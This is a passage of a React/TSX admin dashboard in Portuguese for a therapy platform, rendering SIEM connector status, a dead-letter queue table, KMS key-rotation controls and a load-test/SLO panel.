                        {c.circuitBreakerStatus === 'CLOSED' ? '● Operacional' : c.circuitBreakerStatus === 'HALF_OPEN' ? '▲ Testando' : '✕ Circuito Aberto'}
                      </span>
                    </div>

                    <div>
                      <h5 className="text-sm font-bold text-slate-900 dark:text-white truncate" title={c.name}>
                        {c.name}
                      </h5>
                      <p className="font-mono text-[10px] text-slate-500 dark:text-slate-400 truncate mt-0.5" title={c.endpointUrl}>
                        {c.endpointUrl}
                      </p>
                    </div>

                    <div className="p-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 text-xs space-y-1.5">
                      <div className="flex justify-between text-slate-500 dark:text-slate-400">
                        <span>Latência Média:</span>
                        <strong className="text-slate-900 dark:text-white font-mono">{c.stats.lastLatencyMs || 0}ms</strong>
                      </div>
                      <div className="flex justify-between text-slate-500 dark:text-slate-400">
                        <span>Despachos c/ Sucesso:</span>
                        <strong className="text-emerald-600 dark:text-emerald-400 font-mono">{c.stats.successful}</strong>
                      </div>
                      <div className="flex justify-between text-slate-500 dark:text-slate-400">
                        <span>Retries / DLQ:</span>
                        <strong className="text-slate-900 dark:text-white font-mono">{c.stats.retried} / {c.stats.dlqMoved}</strong>
                      </div>
                    </div>

                    <div className="flex flex-wrap gap-1">
                      {c.subscribedEvents.slice(0, 3).map((ev) => (
                        <span key={ev} className="px-1.5 py-0.5 rounded text-[9px] font-mono font-semibold bg-sky-50 dark:bg-sky-950/40 text-sky-700 dark:text-sky-300 border border-sky-200 dark:border-sky-800/50">
                          {ev}
                        </span>
                      ))}
                      {c.subscribedEvents.length > 3 && (
                        <span className="text-[9px] text-slate-400 self-center">+{c.subscribedEvents.length - 3}</span>
                      )}
                    </div>
                  </div>

                  <div className="flex items-center gap-2 pt-3 border-t border-slate-200 dark:border-slate-700">
                    <button
                      onClick={() => handleTestSiemConnector(c.id, c.name)}
                      disabled={testingSiemId === c.id}
                      className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-1.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 text-slate-700 dark:text-slate-200 hover:bg-slate-100 dark:hover:bg-slate-800 text-xs font-semibold cursor-pointer disabled:opacity-50"
                      title="Dispara teste simulado e exibe o payload transformado para inspeção"
                    >
                      <Send className={`w-3 h-3 ${testingSiemId === c.id ? 'animate-spin' : ''}`} />
                      <span>{testingSiemId === c.id ? 'Testando...' : 'Testar Conector'}</span>
                    </button>

                    <button
                      onClick={() => handleDeleteSiemConnector(c.id, c.name)}
                      className="p-1.5 rounded-xl border border-slate-200 dark:border-slate-800 text-rose-600 dark:text-rose-400 hover:bg-rose-50 dark:hover:bg-rose-950/40 cursor-pointer"
                      title="Remover conector"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Seção Dead-Letter Queue (DLQ) & Gestão de Incidentes */}
        <div className="p-5 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-700 space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div className="flex items-center gap-2">
              <FolderSync className="w-4 h-4 text-rose-600 dark:text-rose-400" />
              <h4 className="text-sm font-bold text-slate-900 dark:text-white">
                Dead-Letter Queue (DLQ) — Eventos Esgotados após 5 Tentativas
              </h4>
              <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300">
                {siemDlqItems.length}
              </span>
            </div>

            {siemDlqItems.length > 0 && (
              <button
                onClick={handleReplayAllDlq}
                disabled={replayingAllDlq}
                className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-rose-600 hover:bg-rose-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
              >
                <RotateCcw className={`w-3 h-3 ${replayingAllDlq ? 'animate-spin' : ''}`} />
                <span>{replayingAllDlq ? 'Reprocessando...' : 'Reprocessar Todos na DLQ'}</span>
              </button>
            )}
          </div>

          {siemDlqItems.length === 0 ? (
            <div className="p-4 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 text-xs text-slate-500 dark:text-slate-400 text-center">
              ✅ A Dead-Letter Queue está limpa. Nenhum evento de segurança esgotou o limite de tentativas.
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs">
                <thead className="text-[10px] uppercase text-slate-400 border-b border-slate-200 dark:border-slate-700">
                  <tr>
                    <th className="py-2 pr-3">ID do Evento</th>
                    <th className="py-2 pr-3">Tipo</th>
                    <th className="py-2 pr-3">Provedor</th>
                    <th className="py-2 pr-3">Motivo da Falha</th>
                    <th className="py-2 pr-3">Retido Em</th>
                    <th className="py-2 text-right">Ações</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                  {siemDlqItems.map((item) => (
                    <tr key={item.id} className="hover:bg-slate-100/50 dark:hover:bg-slate-800/50">
                      <td className="py-2.5 pr-3 font-mono font-bold text-slate-900 dark:text-white">
                        {item.id.slice(0, 12)}...
                      </td>
                      <td className="py-2.5 pr-3">
                        <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-indigo-50 dark:bg-indigo-950 text-indigo-700 dark:text-indigo-300">
                          {item.eventType}
                        </span>
                      </td>
                      <td className="py-2.5 pr-3 font-bold uppercase text-[10px] text-slate-600 dark:text-slate-300">
                        {item.provider}
                      </td>
                      <td className="py-2.5 pr-3 text-[11px] text-rose-600 dark:text-rose-400 max-w-xs truncate" title={item.deadLetterReason}>
                        {item.deadLetterReason || 'Falha persistente'}
                      </td>
                      <td className="py-2.5 pr-3 text-[10px] text-slate-400 whitespace-nowrap">
                        {item.deadLetteredAt ? new Date(item.deadLetteredAt).toLocaleString('pt-BR') : '-'}
                      </td>
                      <td className="py-2.5 text-right whitespace-nowrap space-x-1.5">
                        <button
                          onClick={() => handleReplayDlqItem(item.id)}
                          disabled={replayingDlqId === item.id}
                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white text-[10px] font-semibold transition-colors cursor-pointer disabled:opacity-50"
                          title="Tentar enviar novamente"
                        >
                          <RotateCcw className={`w-2.5 h-2.5 ${replayingDlqId === item.id ? 'animate-spin' : ''}`} />
                          <span>Reenviar</span>
                        </button>
                        <button
                          onClick={() => handleDeleteDlqItem(item.id)}
                          className="p-1 rounded-lg text-slate-400 hover:text-rose-600 dark:hover:text-rose-400 cursor-pointer"
                          title="Descartar item da DLQ"
                        >
                          <Trash2 className="w-3 h-3" />
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>

      {/* Card 9: Gestão de Chaves KMS & Rotação Contínua (NIST SP 800-57 & RFC §4.2) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
          <div className="flex items-center gap-3">
            <div className="p-3 rounded-2xl bg-gradient-to-br from-amber-500 to-orange-600 text-white shadow-md shadow-amber-500/20">
              <KeyRound className="w-6 h-6" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
                Gestão de Chaves KMS & Rotação Contínua
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-extrabold bg-amber-100 text-amber-800 dark:bg-amber-950/60 dark:text-amber-300 border border-amber-300 dark:border-amber-700 uppercase tracking-wider">
                  NIST SP 800-57 • RFC §4.2
                </span>
              </h2>
              <p className="text-xs text-slate-500 dark:text-slate-400">
                Envelope Encryption, custódia HSM, ciclo de vida de chaves mestras (KEK) e re-wrapping automático de DEKs em repouso.
              </p>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={fetchKmsData}
              disabled={loadingKms}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-semibold transition-colors cursor-pointer disabled:opacity-50"
              title="Atualizar status do KMS"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loadingKms ? 'animate-spin' : ''}`} />
              <span>Atualizar</span>
            </button>
            <button
              onClick={() => setShowKmsPolicyModal(true)}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-semibold transition-colors cursor-pointer"
            >
              <Workflow className="w-3.5 h-3.5 text-amber-600 dark:text-amber-400" />
              <span>Política</span>
            </button>
            <button
              onClick={handleReWrapKmsDeks}
              disabled={reWrappingKms || loadingKms}
              className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-semibold transition-colors cursor-pointer disabled:opacity-50"
              title="Re-envelopar DEKs legadas para a versão ativa mais recente"
            >
              <FolderSync className={`w-3.5 h-3.5 text-indigo-600 dark:text-indigo-400 ${reWrappingKms ? 'animate-spin' : ''}`} />
              <span>{reWrappingKms ? 'Re-envelopando...' : 'Re-envelopar DEKs'}</span>
            </button>
            <button
              onClick={() => setShowRotateKmsModal(true)}
              className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-amber-600 hover:bg-amber-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer"
            >
              <KeyRound className="w-3.5 h-3.5" />
              <span>Rotacionar KEK Agora</span>
            </button>
          </div>
        </div>

        {/* 4 KPIs de Governança Criptográfica KMS */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="p-4 rounded-2xl bg-amber-50/60 dark:bg-amber-950/20 border border-amber-200 dark:border-amber-800/60">
            <div className="flex items-center justify-between text-amber-700 dark:text-amber-300 text-xs font-semibold mb-1">
              <span>KEK Ativa no HSM</span>
              <span className="p-1 rounded-lg bg-amber-100 dark:bg-amber-900/40 font-mono text-[10px]">
                AES-256-GCM
              </span>
            </div>
            <div className="text-2xl font-black text-amber-900 dark:text-amber-100 font-mono">
              v{kmsStatus?.activeKeyVersion ?? 1}
            </div>
            <p className="text-[11px] text-amber-700/80 dark:text-amber-300/80 mt-1">
              Chave Mestre em uso para novas DEKs
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-800">
            <div className="flex items-center justify-between text-slate-600 dark:text-slate-400 text-xs font-semibold mb-1">
              <span>Versões Gerenciadas</span>
              <span className="p-1 rounded-lg bg-slate-200 dark:bg-slate-700 font-mono text-[10px]">
                NIST SP 800-57
              </span>
            </div>
            <div className="text-2xl font-black text-slate-900 dark:text-white font-mono">
              {kmsStatus?.totalKeysCount ?? 1}
            </div>
            <p className="text-[11px] text-slate-500 dark:text-slate-400 mt-1">
              Histórico seguro mantido para decifragem
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-emerald-50/60 dark:bg-emerald-950/20 border border-emerald-200 dark:border-emerald-800/60">
            <div className="flex items-center justify-between text-emerald-700 dark:text-emerald-300 text-xs font-semibold mb-1">
              <span>Score de Blindagem</span>
              <span className="p-1 rounded-lg bg-emerald-100 dark:bg-emerald-900/40 font-mono text-[10px]">
                {kmsStatus?.complianceScore ?? 100}%
              </span>
            </div>
            <div className="text-2xl font-black text-emerald-900 dark:text-emerald-100 font-mono">
              {kmsStatus?.nistCompliance ? '100% OK' : 'Atenção'}
            </div>
            <p className="text-[11px] text-emerald-700/80 dark:text-emerald-300/80 mt-1">
              Sem chaves expiradas ou não rotacionadas
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-indigo-50/60 dark:bg-indigo-950/20 border border-indigo-200 dark:border-indigo-800/60">
            <div className="flex items-center justify-between text-indigo-700 dark:text-indigo-300 text-xs font-semibold mb-1">
              <span>Auto-Rotação Agendada</span>
              <span className="p-1 rounded-lg bg-indigo-100 dark:bg-indigo-900/40 font-mono text-[10px]">
                {kmsStatus?.policy?.intervalDays ?? 90}d
              </span>
            </div>
            <div className="text-2xl font-black text-indigo-900 dark:text-indigo-100 font-mono">
              {kmsStatus?.policy?.enabled ? 'Ativa' : 'Pausada'}
            </div>
            <p className="text-[11px] text-indigo-700/80 dark:text-indigo-300/80 mt-1">
              {kmsStatus?.policy?.nextScheduledRotationDate 
                ? `Próxima em ${new Date(kmsStatus.policy.nextScheduledRotationDate).toLocaleDateString('pt-BR')}`
                : 'Programada'}
            </p>
          </div>
        </div>

        {/* Banner Arquitetural: Envelope Encryption & Resiliência */}
        <div className="p-4 rounded-2xl bg-gradient-to-r from-amber-500/10 via-orange-500/10 to-amber-500/5 dark:from-amber-950/30 dark:via-orange-950/30 dark:to-amber-950/10 border border-amber-200 dark:border-amber-800/60 flex items-start gap-3.5">
          <div className="p-2 rounded-xl bg-amber-500/20 text-amber-700 dark:text-amber-300 mt-0.5">
            <Lock className="w-5 h-5" />
          </div>
          <div className="text-xs text-slate-700 dark:text-slate-300 space-y-1">
            <p className="font-bold text-slate-900 dark:text-white">
              Como funciona o Ciclo de Vida e Re-wrapping no TerapiaInFoco (RFC §4.2)
            </p>
            <p className="text-slate-600 dark:text-slate-400 leading-relaxed">
              A KEK mestre (Key Encryption Key) reside exclusivamente no Hardware Security Module (HSM). 
              Os prontuários e notas SOAP são protegidos por chaves DEK (Data Encryption Keys) únicas. 
              Ao rotacionar a KEK para uma nova versão, o processo de <strong>Re-wrapping</strong> re-envelopa as DEKs sem 
              necessitar decifrar ou expor o payload clínico em repouso, eliminando pontos únicos de falha e prevenindo vazamentos em massa.
            </p>
          </div>
        </div>

        {/* Tabela do Ciclo de Vida das KEKs (NIST SP 800-57) */}
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
              Ciclo de Vida das Chaves Mestras (KEKs)
            </h3>
            <span className="text-[11px] text-slate-500 dark:text-slate-400 font-mono">
              {kmsStatus?.keys?.length ?? 1} versões registradas
            </span>
          </div>

          <div className="overflow-x-auto border border-slate-200 dark:border-slate-800 rounded-2xl">
            <table className="w-full text-left text-xs">
              <thead className="bg-slate-50 dark:bg-slate-800/60 text-slate-500 dark:text-slate-400 border-b border-slate-200 dark:border-slate-800">
                <tr>
                  <th className="py-2.5 pl-4 pr-3 font-semibold">Versão & Key ID</th>
                  <th className="py-2.5 pr-3 font-semibold">Algoritmo & Provedor</th>
                  <th className="py-2.5 pr-3 font-semibold">Status NIST</th>
                  <th className="py-2.5 pr-3 font-semibold">Criada em</th>
                  <th className="py-2.5 pr-3 font-semibold">Rotacionada em / Expiração</th>
                  <th className="py-2.5 pr-3 font-semibold">DEKs Envelopadas</th>
                  <th className="py-2.5 pr-4 font-semibold text-right">Ações</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                {(kmsStatus?.keys || []).map((k) => (
                  <tr key={k.version} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/30 transition-colors">
                    <td className="py-3 pl-4 pr-3 font-mono font-bold text-slate-900 dark:text-white">
                      <div className="flex items-center gap-2">
                        <span className="px-2 py-0.5 rounded-lg bg-slate-100 dark:bg-slate-800 text-[11px]">
                          v{k.version}
                        </span>
                        <span className="text-[11px] text-slate-500 dark:text-slate-400 truncate max-w-[140px]" title={k.keyId}>
                          {k.keyId}
                        </span>
                      </div>
                    </td>
                    <td className="py-3 pr-3 text-slate-700 dark:text-slate-300">
                      <span className="font-mono text-[11px] font-semibold">{k.algorithm}</span>
                      <span className="text-[10px] text-slate-400 block">{k.providerType}</span>
                    </td>
                    <td className="py-3 pr-3">
                      <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-bold ${
                        k.status === KmsKeyStatus.ACTIVE
                          ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-700'
                          : k.status === KmsKeyStatus.ROTATED
                          ? 'bg-amber-100 text-amber-800 dark:bg-amber-950/60 dark:text-amber-300 border border-amber-300 dark:border-amber-700'
                          : 'bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300 border border-rose-300 dark:border-rose-700'
                      }`}>
                        {k.status}
                      </span>
                    </td>
                    <td className="py-3 pr-3 text-[11px] text-slate-600 dark:text-slate-400 whitespace-nowrap">
                      {new Date(k.createdAt).toLocaleDateString('pt-BR')}
                    </td>
                    <td className="py-3 pr-3 text-[11px] text-slate-600 dark:text-slate-400 whitespace-nowrap">
                      {k.rotatedAt ? (
                        <span title={`Rotacionada em ${new Date(k.rotatedAt).toLocaleString('pt-BR')}`}>
                          Rotacionada ({new Date(k.rotatedAt).toLocaleDateString('pt-BR')})
                        </span>
                      ) : (
                        <span>Expira em {new Date(k.expiresAt).toLocaleDateString('pt-BR')}</span>
                      )}
                    </td>
                    <td className="py-3 pr-3 font-mono font-semibold text-slate-800 dark:text-slate-200">
                      {k.encryptedDeksCount}
                    </td>
                    <td className="py-3 pr-4 text-right whitespace-nowrap">
                      {k.status === KmsKeyStatus.ROTATED ? (
                        <button
                          onClick={() => setRevokeKeyModalTarget(k)}
                          className="px-2.5 py-1 rounded-lg text-rose-600 hover:bg-rose-50 dark:hover:bg-rose-950/40 text-[11px] font-semibold transition-colors cursor-pointer"
                          title="Revogar chave legada permanentemente"
                        >
                          Revogar
                        </button>
                      ) : (
                        <span className="text-[10px] text-slate-400">
                          {k.status === KmsKeyStatus.ACTIVE ? 'Em Uso' : 'Inativa'}
                        </span>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      {/* Card 10: Homologação sob Carga, Stress Concorrente & SLOs RED (k6 / Artillery / RFC §5.1, §5.2) */}
      <div className="bg-white dark:bg-slate-900 rounded-3xl p-6 border border-slate-200 dark:border-slate-800 shadow-sm space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-slate-100 dark:border-slate-800">
          <div className="flex items-center gap-3">
            <div className="p-3 rounded-2xl bg-gradient-to-br from-rose-500 to-red-600 text-white shadow-md shadow-rose-500/20">
              <Flame className="w-6 h-6" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
                Homologação sob Carga & SLOs RED
                <span className="px-2.5 py-0.5 rounded-full text-[10px] font-extrabold bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300 border border-rose-300 dark:border-rose-700 uppercase tracking-wider">
                  k6 • Artillery • RFC §5.1
                </span>
              </h2>
              <p className="text-xs text-slate-500 dark:text-slate-400">
                Simulador de pico de concorrência massiva, medição dos percentis RED P50/P90/P95/P99 e auditoria de SLOs contratuais.
              </p>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={fetchStressData}
              disabled={loadingStress}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-semibold transition-colors cursor-pointer disabled:opacity-50"
              title="Atualizar histórico de benchmarks"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loadingStress ? 'animate-spin' : ''}`} />
              <span>Atualizar</span>
            </button>
            <button
              onClick={handleRunStressTest}
              disabled={runningStress}
              className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl bg-rose-600 hover:bg-rose-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
            >
              <Flame className={`w-3.5 h-3.5 ${runningStress ? 'animate-bounce' : ''}`} />
              <span>{runningStress ? 'Disparando Carga...' : 'Disparar Stress Agora'}</span>
            </button>
          </div>
        </div>

        {/* 4 KPIs de Performance RED & SLOs */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="p-4 rounded-2xl bg-rose-50/60 dark:bg-rose-950/20 border border-rose-200 dark:border-rose-800/60">
            <div className="flex items-center justify-between text-rose-700 dark:text-rose-300 text-xs font-semibold mb-1">
              <span>Vazão Efetiva (Rate)</span>
              <span className="p-1 rounded-lg bg-rose-100 dark:bg-rose-900/40 font-mono text-[10px]">
                Throughput
              </span>
            </div>
            <div className="text-2xl font-black text-rose-900 dark:text-rose-100 font-mono">
              {latestStressReport?.rps ?? 485.4} <span className="text-sm font-normal text-rose-600 dark:text-rose-400">req/s</span>
            </div>
            <p className="text-[11px] text-rose-700/80 dark:text-rose-300/80 mt-1">
              {latestStressReport?.totalRequests ?? 200} reqs em {latestStressReport?.durationMs ?? 412}ms
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-amber-50/60 dark:bg-amber-950/20 border border-amber-200 dark:border-amber-800/60">
            <div className="flex items-center justify-between text-amber-700 dark:text-amber-300 text-xs font-semibold mb-1">
              <span>Latência P99 (Duration)</span>
              <span className="p-1 rounded-lg bg-amber-100 dark:bg-amber-900/40 font-mono text-[10px]">
                SLO &lt; 200ms
              </span>
            </div>
            <div className="text-2xl font-black text-amber-900 dark:text-amber-100 font-mono">
              {latestStressReport?.percentiles.p99 ?? 6.8} <span className="text-sm font-normal text-amber-600 dark:text-amber-400">ms</span>
            </div>
            <p className="text-[11px] text-amber-700/80 dark:text-amber-300/80 mt-1">
              P50: {latestStressReport?.percentiles.p50 ?? 1.8}ms • P95: {latestStressReport?.percentiles.p95 ?? 4.2}ms
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-emerald-50/60 dark:bg-emerald-950/20 border border-emerald-200 dark:border-emerald-800/60">
            <div className="flex items-center justify-between text-emerald-700 dark:text-emerald-300 text-xs font-semibold mb-1">
              <span>Taxa de Erro (Errors)</span>
              <span className="p-1 rounded-lg bg-emerald-100 dark:bg-emerald-900/40 font-mono text-[10px]">
                SLO &lt; 1%
              </span>
            </div>
            <div className="text-2xl font-black text-emerald-900 dark:text-emerald-100 font-mono">
              {latestStressReport?.errorRate ?? 0}%
            </div>
            <p className="text-[11px] text-emerald-700/80 dark:text-emerald-300/80 mt-1">
              {latestStressReport?.successfulRequests ?? 200} sucessos • {latestStressReport?.failedRequests ?? 0} falhas
            </p>
          </div>

          <div className="p-4 rounded-2xl bg-sky-50/60 dark:bg-sky-950/20 border border-sky-200 dark:border-sky-800/60">
            <div className="flex items-center justify-between text-sky-700 dark:text-sky-300 text-xs font-semibold mb-1">
              <span>Auditoria de SLOs</span>
              <span className="p-1 rounded-lg bg-sky-100 dark:bg-sky-900/40 font-mono text-[10px]">
                Contrato RFC
              </span>
            </div>
            <div className="text-2xl font-black text-sky-900 dark:text-sky-100 font-mono">
              {latestStressReport?.allSlosMet ? '100% OK' : `${latestStressReport?.slosPassedCount}/${latestStressReport?.slosTotalCount}`}
            </div>
            <p className="text-[11px] text-sky-700/80 dark:text-sky-300/80 mt-1">
              Todos os 4 SLOs cumpridos sob carga
            </p>
          </div>
        </div>

        {/* Configuração de Disparo do Teste de Carga */}
        <div className="p-4 rounded-2xl bg-slate-50 dark:bg-slate-800/40 border border-slate-200 dark:border-slate-800 space-y-3">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider flex items-center gap-1.5">
              <Gauge className="w-4 h-4 text-rose-600 dark:text-rose-400" />
              Parâmetros de Simulação de Carga
            </h3>
            <span className="text-[11px] text-slate-500 dark:text-slate-400">
              Ajuste o cenário e volume antes de disparar
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div>
              <label className="block text-[11px] font-semibold text-slate-700 dark:text-slate-300 mb-1">
                Cenário de Teste:
              </label>
              <select
                value={stressScenario}
                onChange={(e) => setStressScenario(e.target.value as StressScenario)}
                className="w-full px-3 py-2 rounded-xl bg-white dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
              >
                <option value={StressScenario.FULL_SYSTEM_MIXED}>Pico Misto Completo (Leitura + Cripto + WORM)</option>
                <option value={StressScenario.READ_CONCURRENCY}>Consultas Concorrentes de Agenda</option>
                <option value={StressScenario.CRYPTO_ENVELOPE_STRESS}>Criptografia em Massa (KMS + AES-GCM + FLE)</option>
                <option value={StressScenario.WORM_LEDGER_STRESS}>Gravações Concorrentes na Hash-Chain WORM</option>
                <option value={StressScenario.RATE_LIMIT_SATURATION}>Saturação de Rate Limiter (HTTP 429)</option>
              </select>
            </div>

            <div>
              <label className="block text-[11px] font-semibold text-slate-700 dark:text-slate-300 mb-1">
                Volume de Requisições:
              </label>
              <select
                value={stressRequests}
                onChange={(e) => setStressRequests(Number(e.target.value))}
                className="w-full px-3 py-2 rounded-xl bg-white dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
              >
                <option value={50}>50 Requisições (Rápido)</option>
                <option value={100}>100 Requisições (Padrão)</option>
                <option value={250}>250 Requisições (Médio)</option>
                <option value={500}>500 Requisições (Intenso)</option>
              </select>
            </div>

            <div>
              <label className="block text-[11px] font-semibold text-slate-700 dark:text-slate-300 mb-1">
                Concorrência Simultânea (Workers / VUs):
              </label>
              <select
                value={stressConcurrency}
                onChange={(e) => setStressConcurrency(Number(e.target.value))}
                className="w-full px-3 py-2 rounded-xl bg-white dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
              >
                <option value={5}>5 VUs Concorrentes</option>
                <option value={10}>10 VUs Concorrentes</option>
                <option value={20}>20 VUs Concorrentes</option>
                <option value={30}>30 VUs Concorrentes</option>
              </select>
            </div>
          </div>
        </div>

        {/* Visualizador de Percentis RED */}
        {latestStressReport && (
          <div className="p-4 rounded-2xl border border-slate-200 dark:border-slate-800 space-y-3 bg-white dark:bg-slate-900">
            <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
              Distribuição Estatística de Latência (Percentis RED)
            </h3>
            <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-7 gap-2 text-center text-xs">
              <div className="p-2.5 rounded-xl bg-slate-50 dark:bg-slate-800/60 border border-slate-200 dark:border-slate-700">
                <span className="text-[10px] text-slate-400 block font-semibold">MÍNIMA</span>
                <span className="font-mono font-bold text-slate-800 dark:text-slate-200">{latestStressReport.percentiles.min} ms</span>
              </div>
              <div className="p-2.5 rounded-xl bg-slate-50 dark:bg-slate-800/60 border border-slate-200 dark:border-slate-700">
                <span className="text-[10px] text-slate-400 block font-semibold">MÉDIA</span>
                <span className="font-mono font-bold text-slate-800 dark:text-slate-200">{latestStressReport.percentiles.avg} ms</span>
              </div>
              <div className="p-2.5 rounded-xl bg-emerald-50 dark:bg-emerald-950/30 border border-emerald-200 dark:border-emerald-800 text-emerald-900 dark:text-emerald-200 font-semibold">
                <span className="text-[10px] text-emerald-600 dark:text-emerald-400 block">P50 (MEDIANA)</span>
                <span className="font-mono font-bold">{latestStressReport.percentiles.p50} ms</span>
              </div>
              <div className="p-2.5 rounded-xl bg-sky-50 dark:bg-sky-950/30 border border-sky-200 dark:border-sky-800 text-sky-900 dark:text-sky-200 font-semibold">
                <span className="text-[10px] text-sky-600 dark:text-sky-400 block">P90</span>
                <span className="font-mono font-bold">{latestStressReport.percentiles.p90} ms</span>
              </div>
              <div className="p-2.5 rounded-xl bg-indigo-50 dark:bg-indigo-950/30 border border-indigo-200 dark:border-indigo-800 text-indigo-900 dark:text-indigo-200 font-semibold">
                <span className="text-[10px] text-indigo-600 dark:text-indigo-400 block">P95</span>
                <span className="font-mono font-bold">{latestStressReport.percentiles.p95} ms</span>
              </div>
              <div className="p-2.5 rounded-xl bg-amber-50 dark:bg-amber-950/30 border border-amber-200 dark:border-amber-800 text-amber-900 dark:text-amber-200 font-semibold">
                <span className="text-[10px] text-amber-600 dark:text-amber-400 block">P99 (SLO)</span>
                <span className="font-mono font-bold">{latestStressReport.percentiles.p99} ms</span>
              </div>
              <div className="p-2.5 rounded-xl bg-rose-50 dark:bg-rose-950/30 border border-rose-200 dark:border-rose-800 text-rose-900 dark:text-rose-200 font-semibold">
                <span className="text-[10px] text-rose-600 dark:text-rose-400 block">MÁXIMA</span>
                <span className="font-mono font-bold">{latestStressReport.percentiles.max} ms</span>
              </div>
            </div>
          </div>
        )}

        {/* Tabela dos 4 SLOs Contratuais de Engenharia */}
        <div className="space-y-3">
          <h3 className="text-xs font-bold text-slate-800 dark:text-slate-200 uppercase tracking-wider">
            Auditoria de Cumprimento de SLOs (Service Level Objectives)
          </h3>
          <div className="overflow-x-auto border border-slate-200 dark:border-slate-800 rounded-2xl">
            <table className="w-full text-left text-xs">
              <thead className="bg-slate-50 dark:bg-slate-800/60 text-slate-500 dark:text-slate-400 border-b border-slate-200 dark:border-slate-800">
                <tr>
                  <th className="py-2.5 pl-4 pr-3 font-semibold">ID & Nome do SLO</th>
                  <th className="py-2.5 pr-3 font-semibold">Meta de Engenharia</th>
                  <th className="py-2.5 pr-3 font-semibold">Valor Real Medido</th>
                  <th className="py-2.5 pr-4 font-semibold text-right">Status de Conformidade</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                {(latestStressReport?.slos || []).map((slo) => (
                  <tr key={slo.id} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/30 transition-colors">
                    <td className="py-3 pl-4 pr-3">
                      <span className="font-mono text-[11px] font-bold text-slate-900 dark:text-white block">
                        {slo.id}
                      </span>
